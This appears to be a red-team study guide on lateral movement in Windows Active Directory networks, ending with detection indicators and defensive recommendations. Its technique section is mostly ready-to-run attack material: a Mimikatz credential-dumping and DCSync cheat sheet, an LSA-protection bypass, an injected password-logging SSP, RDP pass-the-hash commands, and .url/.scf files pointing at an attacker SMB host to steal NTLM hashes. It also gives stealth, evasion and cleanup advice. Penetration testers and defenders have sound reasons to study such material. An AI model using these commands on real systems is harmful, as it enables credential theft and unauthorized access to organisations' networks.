## Lateral Movement

This document covers techniques for moving laterally across Windows/AD environments after initial compromise. Each technique includes explanations of what it does, requirements, and when to use it.

---

## Core Concepts to Master

### 1. **Windows Remote Management Protocols**
- **WinRM (Windows Remote Management):** HTTP-based SOAP protocol for remote management
- **RPC (Remote Procedure Call):** Inter-process communication mechanism
- **SMB (Server Message Block):** File sharing and remote service management
- **DCOM (Distributed COM):** Object-based remote execution
- **RDP (Remote Desktop Protocol):** Graphical remote access
- **WMI (Windows Management Instrumentation):** Management infrastructure

### 2. **Authentication & Session Management**
- **Pass-the-Hash (PtH):** NTLM hash authentication without password
- **Pass-the-Ticket (PtT):** Kerberos ticket injection
- **Over-Pass-the-Hash:** Using NTLM hash to request Kerberos TGT
- **Session Types:** Interactive, Network, RemoteInteractive logons
- **Credential Caching:** Where credentials are stored in memory
- **Token Impersonation:** Stealing and using access tokens

### 3. **PowerShell Remoting Architecture**
- **PSSession Objects:** Persistent remote connections
- **Session Configuration:** Endpoint settings and constraints
- **Serialization:** How objects are transferred across sessions
- **Runspaces:** Execution environments for commands
- **Constrained Language Mode:** Security restrictions
- **JEA (Just Enough Administration):** Role-based access control

### 4. **Network Authentication**
- **NTLM Authentication Flow:** Challenge-response mechanism
- **Kerberos Authentication Flow:** Ticket-based authentication
- **Network Logon Type 3:** Credentials not cached on target
- **Interactive Logon Type 2:** Credentials cached on target
- **Double-Hop Problem:** Credential delegation limitations
- **CredSSP:** Credential delegation protocol

### 5. **Windows Services & Processes**
- **Service Control Manager (SCM):** Service management interface
- **Remote Service Creation:** Creating services via SCM
- **PsExec Internals:** How it works under the hood
- **WMI Process Creation:** Using Win32_Process
- **Scheduled Tasks:** AT command and schtasks
- **LSASS Process:** Credential storage and authentication

### 6. **Credential Types & Storage**
- **Plaintext Passwords:** In memory and stored
- **NTLM Hashes:** LM and NT hashes
- **Kerberos Tickets:** TGT and TGS tickets
- **Cached Credentials:** Domain cached credentials
- **LSA Secrets:** Service account passwords
- **DPAPI Credentials:** Encrypted stored credentials

### 7. **Lateral Movement Detection**
- **Windows Event Logs:** Security, System, PowerShell logs
- **Event IDs:** 4624, 4625, 4648, 4672, 4688, 4697, 4720
- **Network Traffic Patterns:** Unusual RPC, SMB, WinRM activity
- **Process Creation Monitoring:** Sysmon, EDR
- **File System Artifacts:** ADMIN$ usage, executable drops
- **Registry Modifications:** Service creation, Run keys

### 8. **Endpoint Security Controls**
- **Windows Firewall:** Port filtering and application rules
- **AppLocker/WDAC:** Application whitelisting
- **Antivirus/EDR:** Behavioral detection and blocking
- **AMSI (Antimalware Scan Interface):** Script scanning
- **LSA Protection:** Credential Guard, PPL
- **Restricted Admin Mode:** RDP credential protection

---

### PowerShell Remoting

```powershell
#Enable PowerShell Remoting on current Machine (Needs Admin Access)
Enable-PSRemoting

#Entering or Starting a new PSSession (Needs Admin Access)
$sess = New-PSSession -ComputerName <Name>
Enter-PSSession -ComputerName <Name> OR -Sessions <SessionName>
```
- **What:** PowerShell Remoting uses WinRM (TCP 5985/5986) to execute commands on remote systems.
- **Requirements:** Local admin on target, WinRM enabled, network connectivity.
- **Why:** Stealthier than RDP; leverages legitimate Windows management protocols.

### Remote Code Execution with PS Credentials

```powershell
$SecPassword = ConvertTo-SecureString '<Wtver>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\<WtverUser>', $SecPassword)
Invoke-Command -ComputerName <WtverMachine> -Credential $Cred -ScriptBlock {whoami}
```
- **What:** Execute commands remotely using explicit credentials (plaintext password).
- **Use case:** When you have credentials but aren't running in that user's context.
- **Note:** Commands run in a new process on the remote machine and return output locally.

### Import a PowerShell Module and Execute its Functions Remotely

```powershell
#Execute the command and start a session
Invoke-Command -Credential $cred -ComputerName <NameOfComputer> -FilePath c:\FilePath\file.ps1 -Session $sess

#Interact with the session
Enter-PSSession -Session $sess

```
- **What:** Load and execute a local PowerShell script on a remote machine via an existing session.
- **Use case:** Running tools (PowerView, Mimikatz, etc.) remotely without dropping files to disk.
- **Why:** Enables "fileless" execution on the target.

### Executing Remote Stateful commands

```powershell
#Create a new session
$sess = New-PSSession -ComputerName <NameOfComputer>

#Execute command on the session
Invoke-Command -Session $sess -ScriptBlock {$ps = Get-Process}

#Check the result of the command to confirm we have an interactive session
Invoke-Command -Session $sess -ScriptBlock {$ps}
```
- **What:** Persistent session that maintains state (variables, objects) across multiple commands.
- **Use case:** Multi-step operations where you need to reference previous command results.
- **Why:** More efficient than creating new sessions for each command; reduces authentication overhead.

### Mimikatz

**What is Mimikatz:** Post-exploitation tool for extracting credentials from memory, performing pass-the-hash/ticket attacks, and manipulating Windows authentication.

```powershell
#The commands are in cobalt strike format!

#Dump LSASS (Local Security Authority Subsystem Service):
mimikatz privilege::debug
mimikatz token::elevate
mimikatz sekurlsa::logonpasswords

#(Over) Pass The Hash - authenticate using NTLM hash without plaintext password
mimikatz privilege::debug
mimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>

#List all available kerberos tickets in memory
mimikatz sekurlsa::tickets

#Dump local Terminal Services credentials (RDP saved credentials)
mimikatz sekurlsa::tspkg

#Dump and save LSASS in a file (for offline analysis)
mimikatz sekurlsa::minidump c:\temp\lsass.dmp

#List cached MasterKeys (used for DPAPI decryption)
mimikatz sekurlsa::dpapi

#List local Kerberos AES Keys (for Kerberos encryption)
mimikatz sekurlsa::ekeys

#Dump SAM Database (local user hashes)
mimikatz lsadump::sam

#Dump SECRETS Database (service account passwords, cached domain credentials)
mimikatz lsadump::secrets

#Inject and dump the Domain Controller's Credentials (requires DC access)
mimikatz privilege::debug
mimikatz token::elevate
mimikatz lsadump::lsa /inject

#DCSync - Dump domain credentials by impersonating a DC (requires Replicating Directory Changes rights)
mimikatz lsadump::dcsync /domain:<DomainFQDN> /all

#Dump password history of a specific user
mimikatz lsadump::dcsync /user:<DomainFQDN>\<user> /history

#List and Dump local kerberos tickets from memory
mimikatz kerberos::list /dump

#Pass The Ticket - inject a Kerberos ticket (.kirbi) into current session
mimikatz kerberos::ptt <PathToKirbiFile>

#List Terminal Services / RDP sessions on the machine
mimikatz ts::sessions

#List Windows Vault credentials (saved passwords in Credential Manager)
mimikatz vault::list
```
- **Note:** Requires local admin or SYSTEM privileges for most operations. Some commands (DCSync) require specific AD permissions.

:exclamation: What if mimikatz fails to dump credentials because of LSA Protection controls ?

- LSA as a Protected Process (Kernel Land Bypass)

  ```powershell
  #Check if LSA runs as a protected process by looking if the variable "RunAsPPL" is set to 0x1
  reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa

  #Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe
  #Now lets import the mimidriver.sys to the system
  mimikatz # !+

  #Now lets remove the protection flags from lsass.exe process
  mimikatz # !processprotect /process:lsass.exe /remove

  #Finally run the logonpasswords function to dump lsass
  mimikatz # sekurlsa::logonpasswords
  ```

- LSA as a Protected Process (Userland "Fileless" Bypass)

  - [PPLdump](https://github.com/itm4n/PPLdump)
  - [Bypassing LSA Protection in Userland](https://blog.scrt.ch/2021/04/22/bypassing-lsa-protection-in-userland)

- LSA is running as virtualized process (LSAISO) by Credential Guard

  ```powershell
  #Check if a process called lsaiso.exe exists on the running processes
  tasklist |findstr lsaiso

  #If it does there isn't a way tou dump lsass, we will only get encrypted data. But we can still use keyloggers or clipboard dumpers to capture data.
  #Lets inject our own malicious Security Support Provider into memory, for this example i'll use the one mimikatz provides
  mimikatz # misc::memssp

  #Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\windows\system32\mimilsa.log
  ```

- [Detailed Mimikatz Guide](https://adsecurity.org/?page_id=1821)
- [Poking Around With 2 lsass Protection Options](https://medium.com/red-teaming-with-a-blue-team-mentaility/poking-around-with-2-lsass-protection-options-880590a72b1a)

### Remote Desktop Protocol

**What:** RDP (port 3389) provides graphical remote desktop access. With RestrictedAdmin mode, you can authenticate using NTLM hash instead of plaintext password.

**RestrictedAdmin Mode:** When enabled, credentials aren't sent to the remote host (preventing credential theft), but allows pass-the-hash attacks.

- Mimikatz:

  ```powershell
  #We execute pass-the-hash using mimikatz and spawn an instance of mstsc.exe with the "/restrictedadmin" flag
  privilege::debug
  sekurlsa::pth /user:<Username> /domain:<DomainName> /ntlm:<NTLMHash> /run:"mstsc.exe /restrictedadmin"

  #Then just click ok on the RDP dialogue and enjoy an interactive session as the user we impersonated
  ```

- xFreeRDP:

```powershell
xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8  /u:<Username> /pth:<NTLMHash> /v:<Hostname | IPAddress>
```
  - **What:** Linux-based RDP client supporting pass-the-hash authentication.

:exclamation: If Restricted Admin mode is disabled on the remote machine we can connect on the host using another tool/protocol like psexec or winrm and enable it by creating the following registry key and setting it's value zero: "HKLM:\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin".

- Bypass "Single Session per User" Restriction

**What:** By default, Windows allows only one RDP session per user. This registry modification allows multiple concurrent sessions.

On a domain computer, if you have command execution as the system or local administrator and want an RDP session that another user is already using, you can get around the single session restriction by adding the following registry key:
```powershell
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fSingleSessionPerUser /t REG_DWORD /d 0
```

Once you've completed the desired stuff, you can delete the key to reinstate the single-session-per-user restriction.
```powershell
REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fSingleSessionPerUse
```
- **Use case:** Establish RDP without kicking off the legitimate user (reduces detection risk).


### URL File Attacks

**What:** Malicious shortcut files that force Windows to authenticate to an attacker-controlled SMB server, leaking NTLM hashes when the file is viewed (not clicked).

**How it works:** When Windows Explorer renders the icon, it attempts to load it from the UNC path, sending NTLMv2 authentication.

- .url file

  ```
  [InternetShortcut]
  URL=whatever
  WorkingDirectory=whatever
  IconFile=\\<AttackersIp>\%USERNAME%.icon
  IconIndex=1
  ```

  ```
  [InternetShortcut]
  URL=file://<AttackersIp>/leak/leak.html
  ```

- .scf file

  ```
  [Shell]
  Command=2
  IconFile=\\<AttackersIp>\Share\test.ico
  [Taskbar]
  Command=ToggleDesktop
  ```

Putting these files in a writeable share the victim only has to open the file explorer and navigate to the share. **Note** that the file doesn't need to be opened or the user to interact with it, but it must be on the top of the file system or just visible in the windows explorer window in order to be rendered. Use Responder or Inveigh to capture the hashes.

- **Capture hashes:** Run `responder -I <interface> -v` on the attacker machine to capture and relay NTLMv2 hashes.
- **Use case:** Phishing via file shares, gaining initial credentials for password cracking or relay attacks.

:exclamation: .scf file attacks won't work on the latest versions of Windows.

### Useful Tools

- [Powercat](https://github.com/besimorhino/powercat) — PowerShell version of netcat with tunneling, relay, and port forwarding
- [SCShell](https://github.com/Mr-Un1k0d3r/SCShell) — Fileless lateral movement via ChangeServiceConfigA API
- [Evil-Winrm](https://github.com/Hackplayers/evil-winrm) — Feature-rich WinRM shell for pentesting (supports upload/download, DLL injection)
- [RunasCs](https://github.com/antonioCoco/RunasCs) — C# implementation of runas.exe with more features and OPSEC improvements
- [ntlm_theft](https://github.com/Greenwolf/ntlm_theft.git) — Generates all file types for NTLM hash theft attacks (.url, .lnk, .scf, etc.)

## Skills to Develop

### Technical Skills

#### 1. **PowerShell Remoting Mastery**
- **PSSession management:** Creating, using, and disposing sessions
- **Invoke-Command:** Single and multi-computer execution
- **Enter-PSSession:** Interactive remote sessions
- **Credential objects:** Creating and managing PSCredential
- **Session configuration:** Customizing remote endpoints
- **Background jobs:** Asynchronous remote execution
- **Double-hop workarounds:** CredSSP, resource-based Kerberos

#### 2. **Credential Handling**
- **Mimikatz proficiency:** All sekurlsa, kerberos, token modules
- **Token manipulation:** Steal, impersonate, make tokens
- **Hash extraction:** From LSASS, SAM, LSA Secrets
- **Ticket extraction and injection:** Pass-the-ticket attacks
- **Credential reuse:** Password spraying across systems
- **Rubeus:** Kerberos ticket manipulation
- **Safe credential storage:** SecureString, encrypted files

#### 3. **Remote Execution Methods**
- **PsExec variants:** Original, Impacket, custom implementations
- **WMI execution:** Win32_Process, event subscriptions
- **DCOM execution:** MMC20.Application, ShellWindows, etc.
- **Scheduled tasks:** schtasks, at command
- **Service manipulation:** sc.exe, remote service creation
- **PowerShell remoting:** Various execution techniques
- **RDP with restricted admin:** Pass-the-hash via RDP

#### 4. **Network Protocol Exploitation**
- **SMB abuse:** ADMIN$, C$, IPC$ share usage
- **RPC function calls:** Creating services, processes remotely
- **WinRM configuration:** Enabling, configuring, using
- **NTLM relay:** Capturing and forwarding authentication
- **Kerberos delegation abuse:** Unconstrained and constrained
- **Coercion techniques:** Forcing authentication (Printer bug, PetitPotam)

#### 5. **File Transfer Techniques**
- **SMB file copy:** Copy-Item, robocopy, xcopy
- **PowerShell download:** Invoke-WebRequest, System.Net.WebClient
- **Base64 encoding/decoding:** Text-based transfer
- **certutil abuse:** Download files using Windows binary
- **bitsadmin:** Background Intelligent Transfer Service
- **WebDAV:** Web-based file transfer
- **Living-off-the-land binaries:** Using native Windows tools

#### 6. **Evasion & Stealth**
- **AMSI bypass:** Reflection-based and patching techniques
- **ETW (Event Tracing for Windows) evasion:** Disabling logging
- **Obfuscation:** PowerShell, command-line, payload obfuscation
- **In-memory execution:** Avoid disk-based detection
- **Proxy-aware tools:** Respecting corporate proxies
- **Protocol manipulation:** Using alternate ports, encryption
- **Living-off-the-land:** Using built-in Windows tools only

#### 7. **RDP Techniques**
- **Pass-the-hash via RDP:** Restricted Admin mode exploitation
- **Session hijacking:** Taking over existing RDP sessions
- **Multi-session configuration:** Concurrent RDP sessions
- **RDP certificate theft:** Stealing saved RDP credentials
- **Clipboard and drive redirection:** Data exfiltration
- **xfreerdp usage:** Linux-based RDP with PTH support

#### 8. **Hash Stealing & Coercion**
- **URL file attacks:** .url, .lnk, .scf file techniques
- **Responder/Inveigh:** Network credential capture
- **ntlm_theft:** Automated hash theft file generation
- **WebDAV coercion:** Forcing WebDAV authentication
- **SMB coercion:** Forcing SMB authentication
- **LLMNR/NBT-NS poisoning:** Name resolution poisoning

### Analytical Skills

#### 1. **Network Mapping**
- Identifying network topology
- Understanding subnet segmentation
- Recognizing VLANs and security zones
- Mapping trust relationships between systems
- Identifying jump servers and bastion hosts

#### 2. **Privilege Assessment**
- Determining local admin access across estate
- Identifying credential reuse patterns
- Finding where domain admins are logged in
- Recognizing high-value targets
- Understanding organizational structure

#### 3. **Path Planning**
- Choosing optimal lateral movement paths
- Avoiding detection chokepoints
- Identifying alternative routes
- Understanding monitoring blind spots
- Planning multi-hop movements

#### 4. **Risk Evaluation**
- Assessing detection likelihood per technique
- Understanding noise levels of methods
- Evaluating operational security risks
- Balancing speed versus stealth
- Knowing when to pivot techniques

### Operational Skills

#### 1. **Enumeration Methodology**
- **Session enumeration:** Finding logged-on users
- **Local admin discovery:** Where you have admin rights
- **Share enumeration:** Accessible network shares
- **Service discovery:** SQL, Exchange, web servers
- **Process enumeration:** Understanding running services
- **Network mapping:** Subnet and host discovery

#### 2. **Movement Execution**
- Systematic host-to-host progression
- Maintaining multiple access points
- Documenting movement paths
- Credential tracking and organization
- Session management across systems
- Coordinating multi-system operations

#### 3. **Tool Proficiency**
- **CrackMapExec:** Multi-protocol lateral movement
- **Evil-WinRM:** Advanced WinRM shell
- **Impacket suite:** psexec.py, wmiexec.py, smbexec.py, atexec.py
- **BloodHound:** Identifying movement paths
- **PowerView:** Session and share enumeration
- **Metasploit modules:** Various lateral movement modules
- **Cobalt Strike:** Beacon lateral movement features

#### 4. **Operational Security**
- Minimizing logged events
- Cleaning up artifacts
- Avoiding high-visibility actions
- Timing attacks to blend in
- Using legitimate admin tools
- Understanding blue team capabilities

---

## Learning Path Recommendations

### Beginner Level
1. Understand basic Windows authentication (NTLM, Kerberos)
2. Learn PowerShell basics and remoting
3. Practice local credential dumping
4. Understand SMB shares and file transfer
5. Learn basic RDP usage
6. Practice in isolated lab environment

### Intermediate Level
1. Master PowerShell remoting techniques
2. Learn pass-the-hash attacks
3. Practice with Impacket tools (psexec, wmiexec)
4. Understand token manipulation
5. Learn WMI-based execution
6. Practice credential reuse across systems
7. Study event logs and artifacts

### Advanced Level
1. Master multiple lateral movement techniques
2. Learn NTLM relay attacks
3. Practice coercion techniques
4. Understand double-hop problem solutions
5. Learn DCOM-based execution
6. Master evasion techniques (AMSI, ETW bypass)
7. Practice in monitored environments

### Expert Level
1. Develop custom lateral movement tools
2. Chain multiple techniques for complex scenarios
3. Bypass advanced security controls
4. Understand and exploit trust relationships
5. Teach and mentor others
6. Contribute to offensive tools
7. Research novel techniques

---

## Recommended Lab Practice

### Lab Setup Requirements
- **Multi-system environment:** 5+ Windows systems (servers and workstations)
- **Active Directory:** Domain-joined machines
- **Varied access:** Different privilege levels
- **Security controls:** AV, EDR, firewall for evasion practice
- **Monitoring:** SIEM, Sysmon for blue team perspective
- **Network segmentation:** Multiple subnets
- **Snapshot capability:** Quick rollback

### Practice Scenarios

#### 1. **PowerShell Remoting Mastery**
- Enable WinRM on target systems
- Create and manage PSSessions
- Execute commands on multiple systems
- Practice double-hop authentication
- Transfer files via PowerShell
- Evade PowerShell logging

#### 2. **Pass-the-Hash Attacks**
- Dump NTLM hashes from compromised system
- Use PsExec with hash
- Use Impacket tools with hash
- RDP with restricted admin mode
- CrackMapExec with hash spraying
- Clean up artifacts

#### 3. **Token Manipulation**
- List available tokens on system
- Steal tokens from privileged processes
- Impersonate domain admin tokens
- Create tokens with stolen credentials
- Understand token privileges
- Practice token evasion

#### 4. **WMI & DCOM Execution**
- Execute commands via WMI
- Create processes remotely
- Use various DCOM objects
- Understand event log signatures
- Practice fileless execution
- Evade common detections

#### 5. **NTLM Relay & Coercion**
- Set up Responder/ntlmrelayx
- Create hash theft files (.url, .lnk)
- Force authentication with printer bug
- Relay to SMB, LDAP, HTTP
- Chain relays across systems
- Understand mitigation controls

#### 6. **Multi-Hop Movement**
- Move from workstation to server
- Pivot through jump server
- Reach isolated network segment
- Maintain access across reboots
- Document complete path
- Practice cleanup procedures

#### 7. **Stealth Movement**
- Move laterally with minimal logs
- Use native Windows tools only
- Avoid common EDR triggers
- Time attacks with normal activity
- Clean up all artifacts
- Complete without detection in monitored environment

---

## Detection & Blue Team Awareness

### Key Indicators of Compromise

#### PowerShell Remoting Detection
- Event ID 4624 (Logon Type 3 - Network)
- Event ID 4648 (Explicit credential logon)
- PowerShell logs (Event IDs 4103, 4104)
- WinRM service logs
- Unusual network connections to port 5985/5986

#### Pass-the-Hash Detection
- Event ID 4624 (Logon Type 3) without corresponding 4648
- Logons with NTLM when Kerberos is expected
- Service creation events (Event ID 7045)
- Admin share access (Event ID 5140)
- Process creation as SYSTEM from network logon

#### WMI Execution Detection
- Event ID 4624 (Logon Type 3)
- WMI-Activity logs (Event IDs 5857-5861)
- Process creation via WmiPrvSE.exe parent
- Network connections from WMI service
- Unusual WMI namespace queries

#### RDP Detection
- Event ID 4624 (Logon Type 10 - RemoteInteractive)
- Event ID 4778/4779 (Session connect/disconnect)
- Restricted Admin mode usage
- Multiple concurrent sessions
- RDP from unusual source IPs

#### Hash Theft Detection
- File creation of suspicious types (.lnk, .url, .scf)
- Responder/poisoning traffic on network
- Multiple failed authentication attempts
- WebDAV service starting unexpectedly
- SMB connections to unusual destinations

### Defensive Recommendations
- **Least Privilege:** Minimize local admin accounts
- **LAPS:** Unique local admin passwords per machine
- **Credential Guard:** Protect credentials from extraction
- **Restricted Admin:** Prevent credential caching in RDP
- **SMB Signing:** Enforce to prevent relay attacks
- **Network Segmentation:** Isolate sensitive systems
- **Monitoring:** Enable advanced auditing, deploy SIEM
- **EDR Deployment:** Behavioral detection across estate
- **Admin Workstations:** Dedicated PAWs for admins
- **Disable Services:** Disable WMI, WinRM where not needed

---